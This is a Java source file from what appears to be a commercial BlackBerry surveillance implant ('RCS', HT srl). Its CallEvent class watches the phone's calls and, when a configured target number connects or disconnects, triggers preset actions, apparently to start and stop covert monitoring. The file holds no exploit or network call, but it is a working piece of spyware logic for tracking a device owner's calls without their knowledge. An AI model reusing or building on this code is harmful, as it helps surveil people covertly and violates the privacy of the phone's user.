//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib
 * File         : CallEvent.java
 * Created      : 26-mar-2010
 * *************************************************/
package blackberry.event;

import java.io.EOFException;

import net.rim.device.api.util.DataBuffer;
import blackberry.AppListener;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.interfaces.PhoneCallObserver;
import blackberry.utils.WChar;

// TODO: Auto-generated Javadoc
/**
 * The Class CallEvent.
 */
public final class CallEvent extends Event implements PhoneCallObserver {
    //#ifdef DEBUG
    private static Debug debug = new Debug("CallEvent", DebugLevel.VERBOSE);
    //#endif

    String number;
    int actionOnEnter;
    int actionOnExit;

    /**
     * Instantiates a new call event.
     * 
     * @param actionId
     *            the action id
     * @param confParams
     *            the conf params
     */
    public CallEvent(final int actionId, final byte[] confParams) {
        super(Event.EVENT_CALL, actionId, confParams, "CallEvent");
        setPeriod(NEVER);
    }

    protected void actualStart() {
        AppListener.getInstance().addPhoneCallObserver(this);
    }

    protected void actualStop() {
        AppListener.getInstance().removePhoneCallObserver(this);
    }

    /*
     * (non-Javadoc)
     * @see blackberry.threadpool.TimerJob#actualRun()
     */
    protected void actualRun() {
    }

    /*
     * (non-Javadoc)
     * @see blackberry.event.Event#parse(byte[])
     */
    protected boolean parse(final byte[] confParameters) {
        final DataBuffer databuffer = new DataBuffer(confParameters, 0,
                confParameters.length, false);
        try {
            actionOnEnter = actionId;
            actionOnExit = databuffer.readInt();

            int len = databuffer.readInt();
            byte[] array = new byte[len];
            databuffer.read(array);
            number = WChar.getString(array, true);

        } catch (final EOFException e) {
            return false;
        }

        //#ifdef DEBUG_INFO
        debug.info("number: " + number);
        //#endif

        return true;
    }

    public void onCallAnswered(int callId, String phoneNumber) {
        // TODO Auto-generated method stub

    }

    public void onCallConnected(int callId, String phoneNumber) {
        if (number.length() == 0 || phoneNumber.endsWith(number)) {
            trigger(actionOnEnter);
        }
    }

    public void onCallDisconnected(int callId, String phoneNumber) {
        if (number.length() == 0 || phoneNumber.endsWith(number)) {
            trigger(actionOnExit);
        }
    }

    public void onCallIncoming(int callId, String phoneNumber) {
        // TODO Auto-generated method stub

    }

}
